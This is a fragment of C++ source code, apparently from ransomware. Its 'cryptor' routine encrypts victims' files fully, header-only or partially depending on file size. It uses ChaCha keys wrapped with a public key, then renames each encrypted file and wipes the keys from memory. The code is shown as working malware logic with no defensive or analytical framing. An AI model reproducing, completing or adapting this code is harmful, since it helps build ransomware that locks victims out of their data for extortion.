	else {

		if (FileInfo->FileSize <= 1048576) {

			if (!WriteEncryptInfo(FileInfo, FULL_ENCRYPT, 0)) {
				return FALSE;
			}

			Result = EncryptFull(FileInfo, Buffer, CryptoProvider, PublicKey);

		}
		else if (FileInfo->FileSize <= 5242880) {

			if (!WriteEncryptInfo(FileInfo, HEADER_ENCRYPT, 0)) {
				return FALSE;
			}

			Result = EncryptHeader(FileInfo, Buffer, CryptoProvider, PublicKey);

		}
		else {

			if (!WriteEncryptInfo(FileInfo, PARTLY_ENCRYPT, global::GetEncryptSize())) {
				return FALSE;
			}

			Result = EncryptPartly(FileInfo, Buffer, CryptoProvider, PublicKey, global::GetEncryptSize());

		}

	}

	if (Result) {

		pCloseHandle(FileInfo->FileHandle);
		FileInfo->FileHandle = INVALID_HANDLE_VALUE;
		ChangeFileName(FileInfo->Filename);

	}

	CloseFile(FileInfo);
	return Result;
}

VOID
cryptor::CloseFile(__in LPFILE_INFO FileInfo)
{
	RtlSecureZeroMemory(FileInfo->ChachaKey, 32);
	RtlSecureZeroMemory(FileInfo->ChachaIV, 8);

	if (FileInfo->FileHandle != INVALID_HANDLE_VALUE) {

		pCloseHandle(FileInfo->FileHandle);
		FileInfo->FileHandle = INVALID_HANDLE_VALUE;

	}

	RtlSecureZeroMemory(FileInfo->EncryptedKey, 524);
}
